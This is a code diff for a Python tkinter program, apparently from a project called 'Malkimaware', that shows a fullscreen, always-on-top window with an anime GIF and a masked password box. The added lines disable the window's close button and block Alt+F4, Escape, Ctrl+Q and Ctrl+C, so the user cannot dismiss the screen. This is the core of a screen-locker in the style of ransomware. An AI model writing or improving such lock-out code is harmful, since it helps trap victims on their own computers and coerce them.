@@ -36,9 +36,12 @@ class MalkimaApp:
         self.root.attributes("-topmost", True)
         self.root.configure(bg='black')
         
-        # Bloqueos de cierre
-        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
-        self.root.bind("<Alt-F4>", lambda e: "break")
+        # --- BLOQUEOS DE CIERRE ROBUSTOS ---
+        self.root.protocol("WM_DELETE_WINDOW", lambda: None) # Bloquea la "X"
+        self.root.bind("<Alt-F4>", lambda e: "break")        # Bloquea Alt+F4
+        self.root.bind("<Escape>", lambda e: "break")        # Bloquea tecla Esc
+        self.root.bind("<Control-q>", lambda e: "break")     # Bloquea Ctrl+Q
+        self.root.bind("<Control-c>", lambda e: "break")     # Bloquea Ctrl+C
 
         # Configuración del Canvas para el GIF
         self.canvas = tk.Canvas(root, width=root.winfo_screenwidth(), 
@@ -46,23 +49,35 @@ class MalkimaApp:
                                 bg='black', highlightthickness=0)
         self.canvas.pack()
         
+        # --- LÓGICA DE RUTAS MEJORADA ---
+        base_dir = os.path.dirname(os.path.abspath(__file__)) # Ruta de src/
+        root_dir = os.path.abspath(os.path.join(base_dir, "..")) # Ruta de Malkimaware/
+        
+        posibles_rutas = [
+            os.path.join(root_dir, "assets", "gifmakima.gif"),     # Ejecución normal desde terminal
+            os.path.join(base_dir, "assets", "gifmakima.gif"),     # Por si se ejecuta directo en src
+            resource_path("gifmakima.gif"),                        # Cuando es .exe (ruta raíz empaquetada)
+            resource_path(os.path.join("assets", "gifmakima.gif")) # Cuando es .exe (ruta assets empaquetada)
+        ]
+
+        path_gif = None
+        for ruta in posibles_rutas:
+            if os.path.exists(ruta):
+                path_gif = ruta
+                break
+
         # Cargar GIF de Makima
         try:
-            # Buscamos en assets (local) o en la raíz (si es .exe)
-            try:
-                path_gif = resource_path(os.path.join("assets", "gifmakima.gif"))
-                if not os.path.exists(path_gif): # Si ya está compilado
-                     path_gif = resource_path("gifmakima.gif")
-            except:
-                path_gif = resource_path("gifmakima.gif")
-
+            if path_gif is None:
+                raise FileNotFoundError("No se encontró el archivo gifmakima.gif en ninguna ruta posible.")
+                
             self.img_obj = Image.open(path_gif)
             self.frames = [ImageTk.PhotoImage(img.copy().convert("RGBA")) for img in ImageSequence.Iterator(self.img_obj)]
             self.current_frame = 0
             self.animate_gif()
         except Exception as e:
             self.canvas.create_text(root.winfo_screenwidth()//2, 200, 
-                                    text=f"Error cargando recursos", fill="white", font=("Arial", 20))
+                                    text=f"Error cargando recursos: {e}", fill="red", font=("Arial", 14))
 
         # Cuadro de entrada
         self.entry = tk.Entry(root, show="*", font=("Arial", 24), justify='center', bg="#1a1a1a", fg="white", insertbackground="white")
